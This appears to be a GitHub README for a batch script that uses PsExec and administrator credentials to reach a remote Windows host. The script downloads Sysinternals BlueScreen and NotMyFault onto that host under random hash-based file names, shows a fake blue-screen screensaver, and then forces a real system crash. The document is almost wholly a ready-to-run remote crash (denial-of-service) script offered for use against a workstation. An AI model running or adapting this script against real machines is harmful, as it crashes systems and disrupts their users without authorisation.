# bsod-sysinter

The following script leverages the PSExec, SysInternalsBluescreen.scr, and notmyfaultc64.exe components of Sysinternals Suite to flash a blue screen screensaver and force a BSOD against a remote Windows 10 workstation. It assumes knowledge of administrative credentials and was tested against Windows Server 2019 v1909 with the Windows Firewall in its default configuration state.

```bat
FOR /F "tokens=*" %%g IN ('powershell.exe -NoProfile -command "& {$stringAsStream = [System.IO.MemoryStream]::new(); $writer = [System.IO.StreamWriter]::new($stringAsStream); $out = (Get-Random) -join \"`n\"; $writer.write($out); $writer.Flush(); $stringAsStream.Position = 0; Get-FileHash -InputStream $stringAsStream -Algorithm SHA256 | Select-Object Hash}"') do (SET VAR=%%g)
echo %VAR%

FOR /F "tokens=*" %%g IN ('powershell.exe -NoProfile -command "& {$stringAsStream = [System.IO.MemoryStream]::new(); $writer = [System.IO.StreamWriter]::new($stringAsStream); $out = (Get-Random) -join \"`n\"; $writer.write($out); $writer.Flush(); $stringAsStream.Position = 0; Get-FileHash -InputStream $stringAsStream -Algorithm SHA256 | Select-Object Hash}"') do (SET VAR2=%%g)
echo %VAR2%

psexec.exe \\192.168.0.12 -u Administrator cmd
curl https://download.sysinternals.com/files/BlueScreen.zip --output %USERPROFILE%\%VAR%.zip
curl https://download.sysinternals.com/files/NotMyFault.zip --output %USERPROFILE%\%VAR2%.zip
tar -xf %USERPROFILE%\%VAR%.zip -C %USERPROFILE% REM extract to Administrator's user profile
tar -xf %USERPROFILE%\%VAR2%.zip -C %USERPROFILE%
exit
psexec.exe -i \\192.168.0.12 -u Administrator "%USERPROFILE%\SysInternalsBluescreen.scr" /s Rem Previous interactive Psexec session exited so that another can be spawned in the active user session
psexec.exe \\192.168.0.12 -u Administrator "%USERPROFILE%\notmyfaultc64.exe" crash 0x01
```

### Files in Targeted Directory

![alt text](https://github.com/kevinkenzhao/bsod-sysinter/blob/main/file-drop.png?raw=true)



Reference: https://docs.microsoft.com/en-us/troubleshoot/windows/win32/screen-saver-command-line
